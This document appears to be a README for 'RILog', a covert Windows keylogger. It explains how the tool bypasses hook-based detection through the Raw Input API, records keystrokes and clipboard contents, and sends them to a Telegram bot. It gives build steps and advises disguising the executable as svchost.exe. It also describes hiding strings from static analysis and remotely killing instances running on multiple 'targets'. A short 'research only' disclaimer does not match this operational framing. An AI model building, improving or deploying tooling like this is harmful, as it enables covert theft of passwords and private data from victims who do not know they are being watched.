# RILog

Minimal user-space keylogger using the Windows Raw Input API. 

Bypasses standard `SetWindowsHookEx` monitoring by registering a hidden message-only window and grabbing hardware events (`RIDEV_INPUTSINK`) before they get translated into typical `WM_KEYDOWN` messages. 

Stealthier than basic hooks, runs entirely in user-space (no driver signing BS required). Exfiltrates captured keystrokes asynchronously to a Telegram bot via WinHTTP.

## build
Requires CMake and a MSVC compiler.

Because this logger utilizes C++ `constexpr` string obfuscation, you **must** hardcode your Telegram credentials directly into `main.cpp` before compiling.

Open `main.cpp` and locate the `BOT_TOKEN` and `CHAT_ID` constants at the top. Replace the placeholder text inside the `OW()` wrappers with your actual credentials:
```cpp
const std::wstring BOT_TOKEN = OW(L"YOUR_BOT_TOKEN_HERE");
const std::wstring CHAT_ID = OW(L"YOUR_CHAT_ID_HERE");
```

```cmd
mkdir build
cd build
cmake ..
cmake --build . --config Release
```

## features
- **Raw Input API:** Bypasses basic `SetWindowsHookEx` detection.
- **Window Tracking:** Actively monitors `GetForegroundWindow()` and groups keystrokes under the active application title (e.g. `[►] [Google Chrome - YouTube]`).
- **Clipboard Monitoring:** Hooks the Windows Clipboard Viewer chain. Instantly intercepts and exfiltrates copied text with a `[✂️ CLIPBOARD COPIED]` tag.
- **Telegram Exfil:** Sends logs directly to your chat via native WinHTTP.
- **Remote Kill Switch:** Actively polls Telegram. Send `/kill` to your bot to instantly terminate the logger remotely.
- **Smart Backspace:** Processes `[BS]` keystrokes internally to clean up typos before sending the log.
- **String Obfuscation:** Uses C++ `constexpr` templates to XOR encode sensitive strings (like bot tokens, API URLs, and tags) at compile-time, hiding them from static analysis. 
- **Single Instance:** Uses a named mutex to prevent accidental double-execution.

## usage
Run `svchost.exe`. It hides the console immediately and sends a startup notification with the machine name to your bot. Keystrokes are buffered and sent to the configured Telegram chat every 1024 characters, whenever the `[ENT]` key is pressed, or whenever the active window changes.

Because the executable is named `svchost.exe`, it will blend in with the legitimate Windows Service Host processes in Task Manager, making it much harder for an average user to spot.

**To stop the logger:** Because you might have this running on multiple targets, the kill command requires the machine name to prevent accidentally killing the wrong instance.
- Send `/kill COMPUTERNAME` to your bot to terminate a specific instance (the computer name is provided in the startup message).
- Send `/kill_all` to instantly terminate every active logger listening to that bot.

The logger will send a final termination confirmation and instantly kill its own process. You don't need to touch the target machine.

## note
PoC / research only.
